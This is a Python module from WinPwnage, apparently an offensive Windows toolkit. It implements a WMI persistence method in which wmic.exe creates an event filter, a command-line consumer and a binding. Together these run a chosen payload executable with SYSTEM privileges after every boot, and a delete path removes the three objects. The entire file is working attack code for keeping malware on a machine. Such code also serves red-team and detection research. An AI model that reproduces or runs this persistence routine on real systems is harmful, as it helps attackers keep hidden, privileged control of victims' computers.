from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time

persistMethod7_info = {
	"Description": "Persistence using wmic.exe (SYSTEM privileges)",
	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
	"Id": "7",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod7",
	"Function Payload": True,
}

def persistMethod7(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	cmds = {
		'create': {
			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360"'),
			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="{name}", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="{name}"\', Consumer=\'CommandLineEventConsumer.Name="{name}"\''),
		},
		'delete': {
			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
		}
	}

	if add:
		if not payloads().exe(payload):
			print_error("Cannot proceed, invalid payload")
			return False

		action = "create"
	else:
		action = "delete"

	for i, cmd in cmds[action]:
		exit_code = process().create('wmic.exe', params=cmd.format(name=name, path=payloads().exe(payload)[1]), get_exit_code=True)
		if exit_code == 0:
			print_success("Successfully {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
		else:
			print_error("Unable to {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))

		time.sleep(3)
